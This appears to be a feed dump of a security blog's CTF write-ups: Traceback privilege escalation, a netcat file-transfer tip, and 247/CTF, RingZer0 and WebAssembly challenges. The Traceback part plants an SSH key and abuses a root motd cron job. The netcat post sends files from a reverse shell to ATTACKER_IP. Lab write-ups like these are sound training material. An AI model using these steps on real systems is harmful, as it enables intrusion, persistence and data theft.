<!--kg-card-end: markdown--><h2 id="gaining-persistency-as-sysadmin">Gaining persistency as sysadmin</h2><p>We start by generating a new RSA key pair:</p><p><code>~ ssh-keygen -t rsa</code><br><br>2. Then we modify the <code>test.lua</code> file we had previously created to add the public key to sysadmin's <code>authorized_keys</code>:</p><pre><code class="language-Lua">os.execute("echo ssh-rsa [PUBLIC_KEY] &gt;&gt; /home/sysadmin/.ssh/authorized_keys")
</code></pre><p>and run the <code>test.lua</code> file just as before:</p><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p><p>3. Now we can access via SSH.</p><!--kg-card-begin: markdown--><pre><code>~ ssh -i key_rsa sysadmin@traceback.htb

#################################
-------- OWNED BY XH4H ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat May 2 03:04:40 2020 from 10.10.14.114
$
</code></pre>
<!--kg-card-end: markdown--><h2 id="getting-root">Getting root</h2><p>Looking at the processes, we see that these operations are occurring periodically:</p><!--kg-card-begin: markdown--><pre><code>$ ps aux
...
root                13:41           /usr/sbin/CRON -f
root                13:41           /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
root                13:41           sleep 30
...
</code></pre>
<!--kg-card-end: markdown--><p>It seems like there's a 30-second period after the copy operation during which we can modify the files in the <code>/etc/update-motd.d</code> directory, and these modified files will then run as root when a user logs into the system.</p><p>This means we can have the system display the <code>root.txt</code> flag on the greeting message, as such:</p><!--kg-card-begin: markdown--><p><code>$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /etc/update-motd.d/00-header</code></p>
<!--kg-card-end: markdown--><p>Then we can simply re-authenticate via SSH:</p><!--kg-card-begin: markdown--><pre><code>$ exit

$ ssh -i key_rsa sysadmin@traceback.htb
#################################
-------- OWNED BY XH4H ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land

[ROOT_FLAG]
</code></pre>
<!--kg-card-end: markdown--><p>Hope you enjoyed it! :)</p>]]></content:encoded></item><item><title><![CDATA[Downloading files from reverse shells using netcat]]></title><description><![CDATA[<p><em>Banner source: </em><a href="https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit">https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit</a></p><p>It's very common that I'm working with a reverse shell and can't use <code>scp</code> to upload or download files, which leads me to Googling this <code>netcat</code> syntax. Well, no more!</p><p>On the remote shell:</p><pre><code>~ nc -w 3 ATTACKER_IP ATTACKER_PORT</code></pre>]]></description><link>https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/</link><guid isPermaLink="false">5f076c7f1e7da103a083f16d</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 09 Jul 2020 19:18:37 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/07/Mendelson-The-Lost-Art-of-Stealing-Fruit.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/07/Mendelson-The-Lost-Art-of-Stealing-Fruit.jpg" alt="Downloading files from reverse shells using netcat"><p><em>Banner source: </em><a href="https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit">https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit</a></p><p>It's very common that I'm working with a reverse shell and can't use <code>scp</code> to upload or download files, which leads me to Googling this <code>netcat</code> syntax. Well, no more!</p><p>On the remote shell:</p><pre><code>~ nc -w 3 ATTACKER_IP ATTACKER_PORT &lt; [file_to_download]</code></pre><p>Note that <code>-w 3</code> sets a 3-second timeout for this operation.</p><p>Then, on the attacker machine:</p><pre><code>~ nc -l ATTACKER_PORT &gt; [output_file_path]</code></pre><p>Thanks folks!</p>]]></content:encoded></item><item><title><![CDATA[247/CTF Write-up | Web Challenges]]></title><description><![CDATA[<p>This post will be updated as I solve more of the <a href="https://247ctf.com/dashboard">247/CTF platform</a>'s web challenges.</p><h2 id="1-trusted-client">1. Trusted Client</h2><blockquote>Developers don't always have time to setup a backend service when prototyping code<em>.</em> Storing credentials on the client side should be fine as long as it's obfuscated right?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/jsfuck.png" class="kg-image"><figcaption>snapshot from</figcaption></figure>]]></description><link>https://inesmartins.github.io//247-ctf-web-write-up/</link><guid isPermaLink="false">5ef865c81e7da103a083e681</guid><category><![CDATA[247ctf]]></category><category><![CDATA[ctf]]></category><category><![CDATA[jwt]]></category><category><![CDATA[jsfuck]]></category><category><![CDATA[javascript]]></category><category><![CDATA[md5]]></category><category><![CDATA[php]]></category><category><![CDATA[magic hashes]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 28 Jun 2020 10:47:34 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/ctf.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/ctf.png" alt="247/CTF Write-up | Web Challenges"><p>This post will be updated as I solve more of the <a href="https://247ctf.com/dashboard">247/CTF platform</a>'s web challenges.</p><h2 id="1-trusted-client">1. Trusted Client</h2><blockquote>Developers don't always have time to setup a backend service when prototyping code<em>.</em> Storing credentials on the client side should be fine as long as it's obfuscated right?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/jsfuck.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"><figcaption>snapshot from the source code</figcaption></figure><p>Yup, this is <a href="https://en.wikipedia.org/wiki/JSFuck">JSFuck</a>. I used an <a href="http://codertab.com/jsunfuck">online decoder</a> to get the original JS code:</p><pre><code class="language-javascript">function anonymous() {
	if (this.username.value == 'the_flag_is' &amp;&amp; this.password.value == '247CTF{6c91b7f7f12c852f892293d16dba0148}') { 
        alert('Valid username and password!');
    } else { alert('Invalid username and password!'); }
}</code></pre><p>Note that some of the online decoders out there are a little buggy, take a look at the console, it might help.</p><hr><h2 id="2-secured-session">2. Secured Session</h2><blockquote>If you can guess our random secret key, we will tell you the flag securely stored in your session.</blockquote><pre><code class="language-python">import os
from flask import Flask, request, session
from flag import flag

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

def secret_key_to_int(s):
    try:
        secret_key = int(s)
    except ValueError:
        secret_key = 0
    return secret_key

@app.route("/flag")
def index():
    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
    session['flag'] = flag
    if secret_key == app.config['SECRET_KEY']:
      return session['flag']
    else:
      return "Incorrect secret key!"

@app.route('/')
def source():
    return "
%s
" % open(__file__).read()

if __name__ == "__main__":
    app.run()</code></pre><p>So, it seems that as long as we send a non-null <code>secret_key</code> parameter, the flag is written to the <code>flag</code> property of the <code>session</code> cookie. Let's confirm this:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/size.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"></figure><p>As you can see, the <code>session</code> cookie is a <a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JWT</a>, which we can <a href="https://jwt.io/">reverse</a>:</p><pre><code>{
  "flag": {
    " b": "MjQ3Q1RGe2RhODA3OTVmOGE1Y2FiMmUwMzdkNzM4NTgwN2I5YTkxfQ=="
  }
}</code></pre><p>Decoding the base64 string we get: <code>247CTF{da80795f8a5cab2e037d7385807b9a91}</code>.</p><hr><h2 id="3-compare-the-pair">3. Compare the pair</h2><blockquote>Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?</blockquote><pre><code class="language-php">&lt;?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) &amp;&amp; md5($salt . $_GET['password']) == $password_hash) {
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?&gt;</code></pre><p>Whenever I find a <code>MD5</code> hash in the wild I google it just in case someone already found the plaintext in another context, however, with this one the only matches that came up were related to this CTF.</p><p>Since the <code>MD5</code> algorithm is not reversible, it's clear that we're not supposed to try and extract the original password logically. After some research I realised that the solution lies in exploiting the "<a href="https://www.whitehatsec.com/blog/magic-hashes/">Magic hashes</a>" vulnerability that has long been identified in PHP.</p><blockquote>Password hashes in PHP are base16 encoded and can come in the form of “0e812389…”. The problem is in <code>==</code> comparison the <code>0e</code> means that if the following characters are all digits the whole string gets treated as a float. [<a href="https://www.whitehatsec.com/blog/magic-hashes/">Source</a>]</blockquote><p>Even more strange:</p><blockquote>If PHP decides that both operands look like numbers, even if they are actually strings, it will convert them both and perform a numeric comparison:<br> <code>TRUE: "0e12345" == "0e54321"</code><br>[<a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">Source</a>]</blockquote><p>So, all we have to do is find the group of characters that when concatenated with the salt and hashed is equal to <code>0e902564435691274142490923013038</code>. Let's create a script that does exactly that:</p><pre><code class="language-php">&lt;?php

$password_hash = "0e902564435691274142490923013038";
$salt = "f789bbc328a3d1a3";

for ($i = 0; $i &lt; 1000000000; $i++) {
    $tmp_pwd = $salt . $i;
    $tmp_pwd_hash = md5($tmp_pwd);
    if ($tmp_pwd_hash == $password_hash) {
    	echo "Match!: " . $tmp_pwd . "\n";
        return;
    }
}

?&gt;</code></pre><p>And we find a match! <code>f789bbc328a3d1a3237701818</code>. </p><p>If we remove the salt - <code>f789bbc328a3d1a3</code> we get a password that works: <code>237701818</code>. </p><p>Let's try it out!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/final.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"></figure><h2 id="4-forgotten-file-pointer">4. Forgotten File Pointer</h2><blockquote>We have opened the flag, but forgot to read and print it. Can you access it anyway?</blockquote><pre><code class="language-php">&lt;?php
  $fp = fopen("/tmp/flag.txt", "r");
  if($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; isset($_GET['include']) &amp;&amp; strlen($_GET['include']) &lt;= 10) {
    include($_GET['include']);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?&gt;</code></pre><p>So, clearly, we need to add an <code>include</code> parameter to the page <code>GET</code> request that has a value under 10 chars, and that somehow lets us print the content of the <code>fp</code> stream, for example something like:</p><pre><code class="language-php">echo fread($fp)</code></pre><p>After toying with the idea of hosting this code on a remote host with a <em>very</em> short URL (and failing miserably), I ended up having to check <a href="https://hackmd.io/@Chivato/rkj-Y1GVI">this write-up</a> in order to get to the solution. </p><p>The solution is actually pretty simple: on Linux systems, every time you create a stream in order to read a file using <code>fopen</code> you're also creating a <a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a> which is basically a file hosted at <code>/dev/fd/</code> that can be passed to the <code>include</code> function.</p><p>File descriptors are identified by a sequential number and we don't know which number matches this file, however, we can simply brute-force the answer:</p><pre><code class="language-python">import os

for i in range(0, 100):
    print("Testing file descriptor " + str(i))
    os.system("curl -s https://[custom_247ctf_subdomain].247ctf.com/?include=/dev/fd/" + str(i) + " &gt;&gt; output.txt")</code></pre><p>After looking at the output file, we get our flag!</p>]]></content:encoded></item><item><title><![CDATA[RingZer0 JavaScript Challenges Write-up | Part II]]></title><description><![CDATA[<p><em>Click <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">here</a> for Part I.</em></p><h2 id="5-valid-key-required">5 - <a href="https://ringzer0ctf.com/challenges/58">Valid Key Required</a></h2><p>On this level instead of user/password form we see an input field where we're supposed to enter a key:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/image-29.png" class="kg-image"></figure><p>The source code for this one is a little more complex. Let's start with the function that's triggered when the</p>]]></description><link>https://inesmartins.github.io//ringzer0-javascript-challenges-write-up-part-ii/</link><guid isPermaLink="false">5ef37f721e7da103a083e372</guid><category><![CDATA[ctf]]></category><category><![CDATA[javascript]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Jun 2020 21:49:01 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o-1.jpg" alt="RingZer0 JavaScript Challenges Write-up | Part II"><p><em>Click <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">here</a> for Part I.</em></p><h2 id="5-valid-key-required">5 - <a href="https://ringzer0ctf.com/challenges/58">Valid Key Required</a></h2><p>On this level instead of user/password form we see an input field where we're supposed to enter a key:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/image-29.png" class="kg-image" alt="RingZer0 JavaScript Challenges Write-up | Part II"></figure><p>The source code for this one is a little more complex. Let's start with the function that's triggered when the user clicks "Validate" - <code>validatekey</code>:</p><pre><code class="language-javascript">var ref = {T: "BG8", J: "jep", j: "M2L", K: "L23", H: "r1A"};

function validatekey() {
    e = false;
    var _strKey = "";
    try {
        _strKey = document.getElementById("key").value;
        
        var a = _strKey.split("-");
        if(a.length !== 5)
            e = true;
        
        var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));
        
        if (!equal(o,ref))
            e = true;
    	} catch (e) {
            e = true;
        }
    
    	if (!e) {
            if (document.location.href.indexOf("?p=") == -1) {
                document.location = document.location.href + "?p=" + _strKey;
            }
        } else {
            $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;");
    }
}</code></pre><p>The most important information we get from this function is that in order to reach the success case, the following condition needs to be true:</p><pre><code class="language-javascript">a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function))  ==  {T: "BG8", J: "jep", j: "M2L", K: "L23", H: "r1A"};</code></pre><p>Let's start by creating a random key (<code>"abcd-efgh-ijkl-mnop-qrst"</code>) and logging the output of the mapping function:</p><pre><code class="language-javascript">var o = a.map(genFunc).reduceRight(callback, new(genFunc(a[4]))(Function));
console.log(o); // { d: "rsa", h: "noe", l: "jki", p: "fgm", t: "bcq" }</code></pre><p>So, now we know the transformation, let's apply the reverse process to get the key that matches the hardcoded object:</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Object</th>
<th>Key</th>
</tr>
</thead>
<tbody>
<tr>
<td>{ d: &quot;rsa&quot;, h: &quot;noe&quot;, l: &quot;jki&quot;, p: &quot;fgm&quot;, t: &quot;bcq&quot; }</td>
<td>abcd-efgh-ijkl-mnop-qrst</td>
</tr>
<tr>
<td>{ T: &quot;BG8&quot;, J: &quot;jep&quot;, j: &quot;M2L&quot;, K: &quot;L23&quot;, H: &quot;r1A&quot; }</td>
<td>8r1T-pLXJ-LM2j-3jeK-ABGH</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>Note: the order in which the parameters are logged is really important, I had to reorder them to get the correct flag.</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Object</th>
<th>Key</th>
</tr>
</thead>
<tbody>
<tr>
<td>{ d: &quot;rsa&quot;, h: &quot;noe&quot;, l: &quot;jki&quot;, p: &quot;fgm&quot;, t: &quot;bcq&quot; }</td>
<td>abcd-efgh-ijkl-mnop-qrst</td>
</tr>
<tr>
<td>{ H: &quot;r1A&quot;, K: &quot;L23&quot;, j: &quot;M2L&quot;, J: &quot;jep&quot;, T: &quot;BG8&quot; }</td>
<td><strong>ABGH-3jeK-LM2j-pL2J-8r1T</strong></td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h2 id="6-why-not">6 - <a href="https://ringzer0ctf.com/challenges/34">Why not</a></h2><p>It seems we're back to the old user/password model, similar to the <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">first 5</a>: </p><pre><code class="language-javascript">var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283);
var u = $("#cuser").val();
var p = $("#cpass").val();
var t = true;

if (u == "administrator") {
    for (i = 0; i &lt; u.length; i++) {
        if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) {
            $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;");
            t = false;
            break;
        }
    }
}</code></pre><p>I think a quick script will give us the password:</p><pre><code class="language-javacript">var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283);
var u = "administrator"

var charCodes = []
for (i = 0; i &lt; u.length; i++) {
  var code = k[i] - u.charCodeAt(i) - i * 10;
  charCodes.push(String.fromCharCode(code));
}
console.log(charCodes.join("")); // "OhLord4309111"</code></pre>]]></content:encoded></item><item><title><![CDATA[RingZer0 JavaScript Challenges Write-up | Part I]]></title><description><![CDATA[<p>I've recently come across RingZer0's <a href="https://ringzer0ctf.com/challenges">online platform</a> and decided to give the JS challenges a try. </p><h2 id="level-1-client-side-validation-is-bad-">Level 1 - <a href="https://ringzer0ctf.com/challenges/27">Client side validation is bad!</a></h2><p>When we access the page we're presented with the following login form:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-page.png" class="kg-image"></figure><p>On the source code we see something interesting: </p><pre><code class="language-javascript">var u = $("#cuser").val();
var p</code></pre>]]></description><link>https://inesmartins.github.io//ringzer0-js-ctf-write-up-client-side-validation-is-bad/</link><guid isPermaLink="false">5ef3654a1e7da103a083e178</guid><category><![CDATA[javascript]]></category><category><![CDATA[ctf]]></category><category><![CDATA[ringzer0]]></category><category><![CDATA[obfuscation]]></category><category><![CDATA[sha1]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Jun 2020 16:29:02 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o.jpg" alt="RingZer0 JavaScript Challenges Write-up | Part I"><p>I've recently come across RingZer0's <a href="https://ringzer0ctf.com/challenges">online platform</a> and decided to give the JS challenges a try. </p><h2 id="level-1-client-side-validation-is-bad-">Level 1 - <a href="https://ringzer0ctf.com/challenges/27">Client side validation is bad!</a></h2><p>When we access the page we're presented with the following login form:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-page.png" class="kg-image" alt="RingZer0 JavaScript Challenges Write-up | Part I"></figure><p>On the source code we see something interesting: </p><pre><code class="language-javascript">var u = $("#cuser").val();
var p = $("#cpass").val();
if(u == "admin" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) {
    if(document.location.href.indexOf("?p=") == -1) {
        document.location = document.location.href + "?p=" + p;
    }
} else {
    $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;");
}</code></pre><p>So, in order to get the password we simply run:</p><pre><code class="language-javascript">String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)
// "JavaScriptIsSecure"</code></pre><h2 id="2-hashing-is-more-secure">2 - <a href="https://ringzer0ctf.com/challenges/30">Hashing is more secure</a></h2><p>This one is pretty much the same as the first but with a slightly different password validation method:</p><pre><code class="language-javascript">if(Sha1.hash(p) == "b89356ff6151527e89c4f3e3d30c8e6586c63962") {</code></pre><p>This one is also pretty simple to decipher using an <a href="https://sha1.gromweb.com/?hash=b89356ff6151527e89c4f3e3d30c8e6586c63962">online SHA1 "reverser"</a>.</p><h2 id="3-then-obfuscation-is-more-secure">3 - <a href="https://ringzer0ctf.com/challenges/31">Then obfuscation is more secure?</a></h2><p>Same format, but this time the code is obfuscated:</p><pre><code class="language-javascript">// Look's like weak JavaScript auth script :)
var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(_0xc360[12])[_0xc360[11]](function (){var _0xf382x1=$(_0xc360[1])[_0xc360[0]]();var _0xf382x2=_0xc360[2];if(_0xf382x1==_0xc360[3]+_0xf382x2){if(document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4])==-1){document[_0xc360[7]]=document[_0xc360[7]][_0xc360[6]]+_0xc360[4]+_0xf382x1;} ;} else {$(_0xc360[10])[_0xc360[9]](_0xc360[8]);} ;} );</code></pre><p>Using an <a href="https://beautifier.io/">online Javascript beautifier</a> we get:</p><pre><code class="language-javascript">$('.c_submit')['click'](function() {
    var _0xf382x1 = $('#cpass')['val']();
    var _0xf382x2 = 'alk3';
    if (_0xf382x1 == '02l1' + _0xf382x2) {
        if (document['location']['href']['indexOf']('?p=') == -1) {
            document['location'] = document['location']['href'] + '?p=' + _0xf382x1;
        };
    } else {
        $('#cresponse')['html']('&lt;div class=\'error\'&gt;Wrong password sorry.&lt;/div&gt;');
    };
});</code></pre><p>Really all we care about is the password validation:</p><pre><code class="language-javascript">var _0xf382x2 = 'alk3';
if (_0xf382x1 == '02l1' + _0xf382x2) {</code></pre><p>So, to get the password, we simply need to do:</p><pre><code class="language-javascript">var _0xf382x2 = 'alk3';
'02l1' + _0xf382x2 // "02l1alk3"</code></pre><h2 id="4-most-secure-crypto-algo">4 - <a href="https://ringzer0ctf.com/challenges/67">Most Secure Crypto Algo</a></h2><p>Similar format, this time the submit event handler uses <code>CryptoJS</code>'s AES algorithm to make the password harder to crack:</p><pre><code class="language-javascript">var k = CryptoJS.SHA256("\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37");
var u = $("#cuser").val();
var p = $("#cpass").val();
var t = true;
if(u == "\x68\x34\x78\x30\x72") {
    if(!CryptoJS.AES.encrypt(
        p, 
        CryptoJS.enc.Hex.parse(k.toString().substring(0,32)), 
        { iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) }
    ) == "ob1xQz5ms9hRkPTx+ZHbVg==") {
        t = false;
    }
}</code></pre><p>To get the user we simply run:</p><pre><code class="language-javascript">"\x68\x34\x78\x30\x72" // "h4x0r"</code></pre><p>To get the password we have to understand the arguments of the <a href="https://cryptojs.gitbook.io/docs/"><code>AES.encrypt</code></a> function of the <a href="https://cryptojs.gitbook.io/docs/">CryptoJS library</a>:</p><ol><li>the message to be encrypted - <code>p</code>, the password entered by the user;</li><li>the secret passphrase - <code>k.toString().substring(0,32)</code>; </li><li>the encryption options - <code>{ iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) }</code></li></ol><p>Since <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a> is a symmetric-key algorithm, if we know the arguments used for the encryption of a certain input, we can retrieve the original input. In this case, the quickest way to do this is by using the <code>AES.decrypt</code> function of the same library.</p><pre><code class="language-javascript">var k = CryptoJS.SHA256("\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37");

var decrypted = CryptoJS.AES.decrypt(
    "ob1xQz5ms9hRkPTx+ZHbVg==",
    CryptoJS.enc.Hex.parse(k.toString().substring(0,32)), 
    { iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) }
)

console.log(decrypted.toString())

// 50617373573052442132383925212a -&gt; (from hex) PassW0RD!289%!*</code></pre>]]></content:encoded></item><item><title><![CDATA[Web Assembly CTF Write-up]]></title><description><![CDATA[<p><em>Banner source: <a href="https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124">https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124</a></em></p><p>I'm been trying to get into Web Assembly for a while, so when I found <a href="https://medium.com/@cyjien/misc-js-scripting-ctf-writeup-ae74b45cb2c0">this CTF write-up</a> by Chiam YJ I decided to give it a try.</p><h1 id="the-original-challenge">The original Challenge</h1><pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;</code></pre>]]></description><link>https://inesmartins.github.io//js-wasm-ctf-write-up/</link><guid isPermaLink="false">5ef27a571e7da103a083e133</guid><category><![CDATA[web-assembly]]></category><category><![CDATA[wasm]]></category><category><![CDATA[ctf]]></category><category><![CDATA[write-up]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 23 Jun 2020 22:00:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/1_f__SEWRvsNwt4B-u8-85Bw.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/1_f__SEWRvsNwt4B-u8-85Bw.png" alt="Web Assembly CTF Write-up"><p><em>Banner source: <a href="https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124">https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124</a></em></p><p>I'm been trying to get into Web Assembly for a while, so when I found <a href="https://medium.com/@cyjien/misc-js-scripting-ctf-writeup-ae74b45cb2c0">this CTF write-up</a> by Chiam YJ I decided to give it a try.</p><h1 id="the-original-challenge">The original Challenge</h1><pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"/&gt;
    &lt;title&gt;crypto&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;script type="text/javascript"&gt;
    var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,3,131,128,128,128,0,2,0,1,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,163,128,128,128,0,3,6,109,101,109,111,114,121,2,0,14,103,101,116,73,110,83,116,114,79,102,102,115,101,116,0,0,5,109,111,114,112,104,0,1,10,148,129,128,128,0,2,132,128,128,128,0,0,65,16,11,133,129,128,128,0,1,6,127,2,64,32,0,65,1,72,13,0,65,0,33,3,3,64,32,3,65,208,0,106,34,1,32,3,65,16,106,45,0,0,34,4,58,0,0,2,64,32,3,65,1,72,13,0,65,0,33,5,32,3,33,6,2,64,3,64,32,4,32,6,65,15,106,45,0,0,115,33,4,32,6,65,2,72,13,1,32,6,65,127,106,33,6,32,5,65,4,72,33,2,32,5,65,1,106,33,5,32,2,13,0,11,11,32,1,32,4,58,0,0,11,32,3,65,1,106,34,3,32,0,71,13,0,11,11,65,208,0,11]);
    var m = new WebAssembly.Instance(new WebAssembly.Module(bin));
    var offset = m.exports.getInStrOffset();
    var flag = prompt("teh flag?");
	  var strBuf = new TextEncoder().encode(flag.slice(0, 64));
	  var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);
	  for (let i = 0; i &lt; strBuf.length; i++) {
        inBuf[i] = strBuf[i];
    }
	  var morph = m.exports.morph(strBuf.length);	
    var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);

    if (btoa(new TextDecoder().decode(outBuf)) === "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ") {
        document.write("congratz!");
    } else {
        document.write("nope!");
    }
&lt;/script&gt;
&lt;/html&gt;
</code></pre><h1 id="static-code-analysis">Static Code Analysis</h1><p>We can divide the code into major sections:</p><h3 id="1-compiling-and-loading-the-binary-code">1. Compiling and Loading the binary Code</h3><p>A <code>WebAssembly.Instance</code> object is a stateful, executable instance of a <code>WebAssembly.Module</code> that contains all the <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Exported_functions">Exported WebAssembly functions</a>. </p><p>In this case, we're creating a new <code>WebAssembly.Instance</code> object (<code>m</code>) that contains all the Exported WebAssembly functions that derive from the compilation of the bytes in the <code>bin</code> byte array.</p><pre><code class="language-javascript">var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
var m = new WebAssembly.Instance(new WebAssembly.Module(bin));)]</code></pre><h3 id="2-encoding-transforming-the-user-input">2. Encoding/Transforming the User Input</h3><p>First, this script starts by converting the first 64 characters introduced by the user into bytes and then writes them to <code>strBuf</code> .</p><pre><code class="language-javascript">var offset = m.exports.getInStrOffset();
var flag = prompt("teh flag?");
var strBuf = new TextEncoder().encode(flag.slice(0, 64));</code></pre><p>When the <code>Uint8Array</code> constructor "is called with a buffer, and optionally a byteOffset and a length argument, a new typed array view is created that views the specified ArrayBuffer. (...)" [<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array/Uint8Array">Source</a>]. </p><p>In this case, the <code>inBuf</code> variable represents a typed array that (most likely) views the entirety of the <code>memory.buffer</code> (this depends on how the <code>getInStrOffset</code> function works and we don't have access to it).</p><pre><code class="language-javascript">var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);</code></pre><p>Then, this new <code>Uint8Array</code> is filled with the bytes from <code>strBuf</code>.</p><pre><code class="language-javascript">for (let i = 0; i &lt; strBuf.length; i++) {
    inBuf[i] = strBuf[i];
